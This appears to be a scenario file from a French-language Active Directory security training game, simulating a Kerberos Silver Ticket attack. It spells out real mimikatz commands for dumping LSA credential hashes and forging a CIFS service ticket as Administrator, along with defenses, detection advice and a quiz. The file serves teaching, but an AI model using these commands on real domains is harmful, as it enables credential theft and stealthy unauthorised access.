SCENARIOS.silverticket = {
  id:'silverticket',
  cmdBudget:9,
  tag:'🥈 SCÉNARIO 12 · SILVER TICKET',
  lessonTag:'📘 LEÇON · SCÉNARIO 12',
  opsecEnabled:true,
  noiseRules:[NOISE.netUserAll, NOISE.netUserOne, NOISE.lsaDump, NOISE.getDomainSid,
              NOISE.silverForge, NOISE.dirShare],
  startUser:'n.ferrari',

  MACHINE_HASH:'3a7f9c2e5d1b8f4a0c6e2d9b5f3a7c1e',
  DOMAIN_SID:'S-1-5-21-3847285910-2947582013-1938472659',
  TARGET:'FILESRV01.corp.local',
  SHARE:'\\\\FILESRV01\\Confidentiel',

  identities:{
    'n.ferrari':{ label:'CORP\\n.ferrari', priv:'Administrateur local (FILESRV01)', groups:['Domain Users','Local Admins FILESRV01'], desc:'Support informatique — Tier 1' },
  },

  objectives:[
    { id:'enum',   text:'Extraire le hash NTLM du compte machine FILESRV01$' },
    { id:'sid',    text:'Récupérer le SID du domaine' },
    { id:'forge',  text:'Forger un Silver Ticket pour le service CIFS de FILESRV01' },
    { id:'access', text:'Accéder au partage confidentiel avec le ticket forgé' },
    { id:'flag',   text:'Lire le flag dans le partage confidentiel' },
  ],

  counterMeasure:{
    label:'Chiffrement AES256 imposé sur le compte machine',
    briefing:"🛡️ Contre-mesure appliquée : FILESRV01 requiert désormais AES256 pour l'authentification Kerberos (msDS-SupportedEncryptionTypes). Les Silver Tickets forgés avec le hash RC4 du compte machine — même parfaitement construits — sont rejetés par le service CIFS sans passer par le KDC."
  },

  hints:[
    ["Tu es administrateur local de FILESRV01. Pour forger un Silver Ticket, tu as besoin du hash NTLM du compte machine. Dump les secrets LSA localement.",
     "mimikatz peut extraire les hashes de tous les comptes locaux et du compte machine depuis la mémoire LSA.",
     "Dump les hashes locaux : `mimikatz lsadump::lsa /patch`"],
    ["Le Silver Ticket est construit avec le SID du domaine + le hash du compte machine. Récupère le SID.",
     "Une commande PowerView te donne directement le SID du domaine.",
     "Récupère le SID du domaine : `get-domainsid`"],
    ["Tu as le hash RC4 du compte FILESRV01$ et le SID du domaine. Tu peux maintenant forger un TGS (pas un TGT) pour le service CIFS de FILESRV01, avec l'identité d'un administrateur.",
     "La commande mimikatz est `kerberos::silver`. Elle prend le service cible, le hash RC4, l'utilisateur à usurper, son RID (500 pour Administrator) et le SID du domaine.",
     "Forge le Silver Ticket : `mimikatz kerberos::silver /target:FILESRV01.corp.local /service:cifs /rc4:3a7f9c2e5d1b8f4a0c6e2d9b5f3a7c1e /user:administrator /id:500 /sid:S-1-5-21-3847285910-2947582013-1938472659`"],
    ["Le ticket est injecté en mémoire. Accède directement au partage confidentiel — le service CIFS de FILESRV01 te verra comme Administrator.",
     "Utilise la notation UNC pour accéder au partage réseau.",
     "Accède au partage : `dir \\\\FILESRV01\\Confidentiel`"],
    ["Le flag est dans un fichier texte dans le partage.",
     "Lis le fichier avec `type`.",
     "Lis le flag : `type \\\\FILESRV01\\Confidentiel\\flag.txt`"]
  ],

  manPages:{
    'mimikatz lsadump': { name:'mimikatz lsadump::lsa /patch', role:'Extrait les hashes NTLM depuis la mémoire LSA du système local',
      explain:"En tant qu'administrateur local, tu peux demander à LSA (Local Security Authority) de déchiffrer ses secrets en mémoire — y compris le hash du compte machine (MACHINE$), qui est ce qui autorise la machine à s'authentifier sur le domaine.",
      usage:'mimikatz lsadump::lsa /patch' },
    'get-domainsid': { name:'get-domainsid', role:'Récupère le SID du domaine Active Directory',
      explain:"Le SID du domaine est un identifiant unique qui entre dans la construction de tous les tickets Kerberos. Un Silver Ticket mal construit (mauvais SID) sera rejeté par le service cible.",
      usage:'get-domainsid' },
    'mimikatz kerberos': { name:'mimikatz kerberos::silver', role:'Forge et injecte un Silver Ticket (TGS) sans passer par le KDC',
      explain:"Contrairement au Golden Ticket (qui nécessite le hash krbtgt), un Silver Ticket utilise le hash NTLM du compte de service ou machine cible. Il est valide uniquement pour ce service précis — mais ne laisse aucune trace sur le contrôleur de domaine car le KDC n'est jamais consulté.",
      usage:'mimikatz kerberos::silver /target:<fqdn_machine> /service:<cifs|http|host|...> /rc4:<hash_machine> /user:<nom> /id:<rid> /sid:<sid_domaine>' },
    'dir': { name:'dir', role:'Liste le contenu d\'un répertoire ou partage réseau',
      explain:"Avec un Silver Ticket CIFS injecté en mémoire, Windows utilise ce ticket pour s'authentifier sur le partage — sans jamais re-demander de ticket au KDC. Le serveur de fichiers valide le ticket localement avec son propre hash.",
      usage:'dir \\\\<serveur>\\<partage>' },
    'type': { name:'type', role:'Lit le contenu d\'un fichier texte',
      explain:"Une fois le partage accessible, `type` fonctionne normalement sur les fichiers distants.",
      usage:'type \\\\<serveur>\\<partage>\\<fichier>' }
  },

  knownCommands:[
    'help','clear','man ',
    'whoami /priv',
    'net user /domain','net user ',
    'mimikatz lsadump::lsa /patch',
    'get-domainsid',
    'mimikatz kerberos::silver ',
    'dir \\\\','type \\\\'
  ],

  helpLine:'whoami /priv, net user /domain, mimikatz lsadump::lsa /patch, get-domainsid, mimikatz kerberos::silver /target:&lt;fqdn&gt; /service:cifs /rc4:&lt;hash&gt; /user:&lt;nom&gt; /id:&lt;rid&gt; /sid:&lt;sid&gt;, dir \\\\&lt;serveur&gt;\\&lt;partage&gt;, type \\\\&lt;chemin&gt;, clear',
  cmdRefHtml:`whoami /priv<br>net user /domain<br>mimikatz lsadump::lsa /patch<br>get-domainsid<br>mimikatz kerberos::silver /target:&lt;fqdn&gt; /service:cifs /rc4:&lt;hash&gt; /user:&lt;nom&gt; /id:&lt;rid&gt; /sid:&lt;sid&gt;<br>dir \\\\&lt;serveur&gt;\\&lt;partage&gt;<br>type \\\\&lt;chemin&gt;<br>help`,

  introLines:[
    `<span class="out-dim">Microsoft Windows [Simulation AD Lab]</span>`,
    `<span class="out-dim">Session ouverte en tant que CORP\\n.ferrari sur FILESRV01 (admin local)</span>`,
    `<span class="out-warn">⚠ Le partage \\\\FILESRV01\\Confidentiel est restreint — accès refusé avec tes droits actuels.</span>`,
    `<span class="out-info">Tape <b>help</b> pour voir les commandes disponibles.</span>`
  ],

  lessonSlides:[
    { icon:'🎟️', title:'Golden vs Silver : quelle différence ?', html:
      `<table class="lesson-table">
        <tr><th></th><th>Golden Ticket</th><th>Silver Ticket</th></tr>
        <tr><td>Hash utilisé</td><td>krbtgt (Domain)</td><td>Compte machine/service</td></tr>
        <tr><td>Type de ticket</td><td>TGT</td><td>TGS (service direct)</td></tr>
        <tr><td>Accès obtenu</td><td>Tout le domaine</td><td>Un seul service</td></tr>
        <tr><td>KDC consulté ?</td><td>Non</td><td>Non</td></tr>
        <tr><td>Trace sur le DC</td><td>Aucune</td><td>Aucune</td></tr>
      </table>
      <p class="lesson-tip">💡 Le Silver Ticket est plus limité mais aussi plus discret — aucun log Kerberos côté contrôleur de domaine, contrairement à une authentification normale.</p>` },
    { icon:'⚙️', title:'Comment fonctionne le Silver Ticket ?', html:
      `<p>Un ticket de service Kerberos (TGS) est chiffré par le <b>service destinataire</b> lui-même, pas par le KDC. Le service le déchiffre avec son propre hash NTLM pour vérifier qui tu es.</p>
       <p>Si tu possèdes le hash NTLM du compte machine (<code>FILESRV01$</code>), tu peux forger un TGS valide — signé correctement — et te faire passer pour n'importe quel utilisateur auprès de ce service. <b>Le KDC n'est jamais contacté.</b></p>` },
    { icon:'🔍', title:'Pourquoi le hash machine ?', html:
      `<p>Chaque machine du domaine possède un compte Active Directory (<code>MACHINENAME$</code>) avec un mot de passe NTLM, changé automatiquement tous les 30 jours. Ce hash est stocké localement dans les secrets LSA.</p>
       <p>En tant qu'administrateur local d'une machine, tu peux extraire ce hash avec <code>lsadump::lsa /patch</code> — sans toucher au contrôleur de domaine.</p>
       <p class="lesson-tip">💡 Le Silver Ticket n'est valide que pour <b>ce service</b> sur <b>cette machine</b> — mais c'est souvent suffisant si la cible intéressante est là.</p>` },
    { icon:'📋', title:'Ta mission', html:
      `<p>Tu es <b>CORP\\n.ferrari</b>, administrateur local de <b>FILESRV01</b>. Le partage <code>\\\\FILESRV01\\Confidentiel</code> est protégé — seuls les Domain Admins y ont accès. Forge un Silver Ticket pour le service CIFS de FILESRV01 et accède-y.</p>
       <p class="lesson-tip">💡 Tape <b>help</b> une fois dans le terminal, ou <b>man &lt;commande&gt;</b> pour les détails d'une commande.</p>` }
  ],

  completeTitle:'Partage confidentiel compromis',
  completeSub:'Silver Ticket forgé sans toucher au KDC — accès CIFS Administrator sans laisser de trace côté DC.',
  chainSteps:[
    {icon:'🔑', label:'Hash machine extrait'},{icon:'🗺️', label:'SID domaine'},
    {icon:'🥈', label:'Silver Ticket forgé'},{icon:'📂', label:'Partage accessible'},
    {icon:'🏁', label:'Flag récupéré'}
  ],
  flag:'FLAG{silver_cifs_filesrv01_no_kdc_trace}',

  graph:{
    nodes:[
      { id:'n.ferrari', label:'n.ferrari', type:'user' },
      { id:'filesrv01', label:'FILESRV01$', type:'service' },
      { id:'share',     label:'\\\\FILESRV01\\Confidentiel', type:'target' }
    ],
    edges:[
      { id:'e_lsa',    from:'n.ferrari', to:'filesrv01', type:'owned',  label:'LSA Dump → hash machine' },
      { id:'e_silver', from:'filesrv01', to:'share',     type:'abuse',  label:'Silver Ticket CIFS' }
    ]
  },

  deepDive:{
    mitre:[{id:'T1558.002', name:'Steal or Forge Kerberos Tickets: Silver Ticket'}],
    why:"Un Silver Ticket est un TGS (Ticket Granting Service) forgé localement, sans jamais contacter le contrôleur de domaine. Il est possible car les services Kerberos valident eux-mêmes les tickets avec leur propre hash NTLM — le KDC ne joue aucun rôle dans cette étape. Un attaquant disposant du hash NTLM d'un compte machine (extrait localement via lsadump::lsa, sans droits domaine) peut se forger un accès en tant qu'Administrator au service CIFS, HTTP, HOST, ou tout autre service hébergé sur cette machine. Le silver ticket ne laisse aucun Event ID Kerberos (4768/4769) côté DC — seul un Event ID 4624 côté serveur cible peut trahir l'authentification.",
    defenses:[
      "Forcer AES256 sur tous les comptes machines (désactiver RC4/DES dans msDS-SupportedEncryptionTypes) — rend les Silver Tickets RC4 invalides, la technique la plus standard",
      "Activer la validation PAC côté service (registry : ValidateKdcPacSignature=1 sur Windows Server 2012+) — le service contacte le KDC pour valider le PAC, ce qui trahit un ticket forgé",
      "Surveiller les Event ID 4624 (Logon Type 3) sans 4768/4769 précédent sur les serveurs de fichiers sensibles — anomalie KDC absente du flux normal",
      "Appliquer le Tier Model : les administrateurs locaux des serveurs de fichiers ne doivent pas pouvoir extraire des secrets LSA (contrôle d'accès à lsass.exe via EDR ou Windows Credential Guard)",
      "Activer Credential Guard sur les hôtes pour protéger les secrets LSA contre l'extraction — rend lsadump::lsa /patch inopérant même avec des droits admin locaux"
    ],
    quiz:[
      { q:"Quelle est la différence principale entre un Golden Ticket et un Silver Ticket ?",
        options:["Le Golden Ticket utilise le hash krbtgt et donne accès à tout le domaine ; le Silver Ticket utilise le hash d'un compte machine/service et est limité à un service précis","Le Silver Ticket nécessite les droits Domain Admin, le Golden Ticket non","Le Golden Ticket ne laisse aucune trace, le Silver Ticket génère des logs côté DC","Le Silver Ticket est plus puissant car il ne passe jamais par le contrôleur de domaine"],
        correct:0,
        explain:"La distinction clé est la portée : Golden Ticket (hash krbtgt) → accès à n'importe quel service du domaine. Silver Ticket (hash compte machine/service) → accès à UN service précis sur UN serveur précis. Les deux évitent le KDC dans leur phase d'utilisation." },
      { q:"Quel Event ID est absent des logs du contrôleur de domaine lors d'une authentification via Silver Ticket ?",
        options:["4624 (ouverture de session)","4768 et 4769 (demandes TGT/TGS)","4662 (accès à un objet AD)","4732 (ajout à un groupe)"],
        correct:1,
        explain:"C'est là que le Silver Ticket est discret : lors d'une authentification Kerberos normale, on voit 4768 (TGT) puis 4769 (TGS) sur le DC. Avec un Silver Ticket, le client va directement au service — aucun log 4768/4769 côté DC, seulement un 4624 côté serveur cible." },
      { q:"Quelle contre-mesure bloque directement les Silver Tickets forgés avec un hash RC4 ?",
        options:["Activer l'audit Kerberos étendu","Forcer AES256 et désactiver RC4 sur les comptes machines","Mettre à jour l'attribut AdminSDHolder","Activer le mode lecture seule sur les contrôleurs de domaine"],
        correct:1,
        explain:"Les Silver Tickets sont par défaut forgés avec RC4 (le hash NTLM). Si le service exige AES256 exclusivement (msDS-SupportedEncryptionTypes), le ticket RC4 est rejeté — même s'il est parfaitement construit. Credential Guard est une alternative complémentaire qui empêche l'extraction du hash en amont." }
    ]
  },

  initState(){
    return { lsaDumped:false, sidKnown:false, ticketForged:false };
  },

  handle(lower, cmd){
    const sc = SCENARIOS.silverticket;

    if(lower === 'whoami /priv' || lower === 'whoami'){
      const u = sc.identities[state.user];
      print(`<span class="out-info">Utilisateur : ${u.label}</span>`);
      print(`<span class="out-info">Rôle : ${u.priv}</span>`);
      print(`<span class="out-info">Groupes : ${u.groups.join(', ')}</span>`);
      return true;
    }

    if(lower === 'net user /domain'){
      addNoise(NOISE.netUserAll.points, NOISE.netUserAll.label);
      print(`<span class="out-info">Comptes du domaine CORP.LOCAL :</span>`);
      print(`<span class="out-dim">Administrator    e.mercier    n.ferrari    p.renault</span>`);
      print(`<span class="out-dim">svc_backup       FILESRV01$   DC01$        krbtgt</span>`);
      print(`<span class="out-dim">... (${Math.floor(Math.random()*20)+160} comptes au total)</span>`);
      return true;
    }

    if(lower.startsWith('net user ') && lower.endsWith('/domain')){
      addNoise(NOISE.netUserOne.points, NOISE.netUserOne.label);
      const name = lower.replace('net user ','').replace(' /domain','').trim();
      print(`<span class="out-dim">Compte : CORP\\${escapeHtml(name)} — aucun détail supplémentaire utile ici.</span>`);
      return true;
    }

    if(lower === 'mimikatz lsadump::lsa /patch'){
      addNoise(NOISE.lsaDump.points, NOISE.lsaDump.label);
      complete('enum');
      state.extra.lsaDumped = true;
      print(`<span class="out-info">[*] Extraction des secrets LSA depuis la mémoire (LSASS)...</span>`);
      print(`<span class="out-dim">  Administrateur       : [NTLM] a3d5e9f1c2b7d4a8e6f0c3b9a2d7e5f1</span>`);
      print(`<span class="out-dim">  n.ferrari            : [NTLM] b7e2a9c4f6d1b3e8a5c0f2d7b4e9a6c3</span>`);
      print(`<span class="out-warn">  FILESRV01$           : [NTLM] ${sc.MACHINE_HASH}  ←</span>`);
      print(`<span class="out-dim">  svc_backup           : [NTLM] c1f4b8e2a7d3c9f5b1e4a8d2c6f3b7e1</span>`);
      print(`<span class="out-good">[+] Hash du compte machine FILESRV01$ extrait sans droits domaine.</span>`);
      return true;
    }

    if(lower === 'get-domainsid'){
      addNoise(NOISE.getDomainSid.points, NOISE.getDomainSid.label);
      complete('sid');
      state.extra.sidKnown = true;
      print(`<span class="out-info">SID du domaine CORP.LOCAL :</span>`);
      print(`<span class="out-warn">${sc.DOMAIN_SID}</span>`);
      return true;
    }

    if(lower.startsWith('mimikatz kerberos::silver')){
      addNoise(NOISE.silverForge.points, NOISE.silverForge.label);

      if(!state.extra.lsaDumped){
        print(`<span class="out-bad">Hash du compte machine FILESRV01$ inconnu. Fais d'abord lsadump::lsa /patch.</span>`);
        return true;
      }
      if(!state.extra.sidKnown){
        print(`<span class="out-bad">SID du domaine inconnu. Récupère-le d'abord avec get-domainsid.</span>`);
        return true;
      }
      if(!lower.includes(sc.MACHINE_HASH)){
        print(`<span class="out-bad">Hash RC4 incorrect — le Silver Ticket serait invalide. Vérifie le hash de FILESRV01$.</span>`);
        return true;
      }
      if(!lower.includes(sc.DOMAIN_SID.toLowerCase())){
        print(`<span class="out-bad">SID du domaine incorrect — ticket rejeté. Utilise le SID affiché par get-domainsid.</span>`);
        return true;
      }
      if(!lower.includes('/service:cifs') && !lower.includes('/service:host')){
        print(`<span class="out-bad">Service non reconnu. Utilise /service:cifs pour accéder au partage réseau.</span>`);
        return true;
      }
      if(state.mitigationApplied){
        print(`<span class="out-bad">Kerberos - ERROR_LOGON_FAILURE : type de chiffrement RC4 (0x17) non accepté par FILESRV01.</span>`);
        print(`<span class="out-dim">💡 FILESRV01 exige AES256 (msDS-SupportedEncryptionTypes). Le Silver Ticket forgé avec le hash NTLM (RC4) est rejeté directement par le service — sans passer par le KDC.</span>`);
        return true;
      }
      state.extra.ticketForged = true;
      complete('forge');
      print(`<span class="out-info">[*] Forge du Silver Ticket (TGS) pour CIFS/FILESRV01.corp.local...</span>`);
      print(`<span class="out-good">[+] Silver Ticket injecté en mémoire (rc4_hmac : ${sc.MACHINE_HASH})</span>`);
      print(`<span class="out-good">[+] Identité usurpée : Administrator (RID 500)</span>`);
      print(`<span class="out-dim">    → Aucune requête envoyée au KDC — aucun log côté DC.</span>`);
      if(typeof AttackGraph !== 'undefined') AttackGraph.reveal('e_silver');
      return true;
    }

    if(lower.startsWith('dir \\\\')){
      addNoise(NOISE.dirShare.points, NOISE.dirShare.label);
      const path = cmd.replace(/^dir /i,'').trim();

      if(!state.extra.ticketForged){
        print(`<span class="out-bad">Accès refusé à ${escapeHtml(path)}.</span>`);
        print(`<span class="out-dim">Tu n'as pas de ticket valide pour ce partage. Forge d'abord le Silver Ticket.</span>`);
        return true;
      }
      if(path.toLowerCase().includes('confidentiel')){
        complete('access');
        print(`<span class="out-info">Contenu de ${escapeHtml(path)} :</span>`);
        print(`<span class="out-dim">  flag.txt</span>`);
        print(`<span class="out-dim">  rapport-comex-2024.pdf</span>`);
        print(`<span class="out-dim">  budget-previsionnel-2025.xlsx</span>`);
        print(`<span class="out-good">Accès en lecture/écriture — identifié comme Administrator.</span>`);
        if(typeof AttackGraph !== 'undefined') AttackGraph.markOwned('share');
      } else {
        print(`<span class="out-dim">Contenu de ${escapeHtml(path)} :</span>`);
        print(`<span class="out-dim">  (partage standard — rien d'intéressant ici)</span>`);
      }
      return true;
    }

    if(lower.startsWith('type \\\\')){
      const path = cmd.replace(/^type /i,'').trim();
      if(!state.extra.ticketForged){
        print(`<span class="out-bad">Accès refusé à ${escapeHtml(path)}.</span>`);
        return true;
      }
      if(path.toLowerCase().endsWith('flag.txt') && path.toLowerCase().includes('confidentiel')){
        complete('flag');
        print(`<span class="out-good">${escapeHtml(sc.flag)}</span>`);
        finishMission();
      } else {
        print(`<span class="out-bad">Fichier introuvable : ${escapeHtml(path)}</span>`);
      }
      return true;
    }

    return false;
  }
};
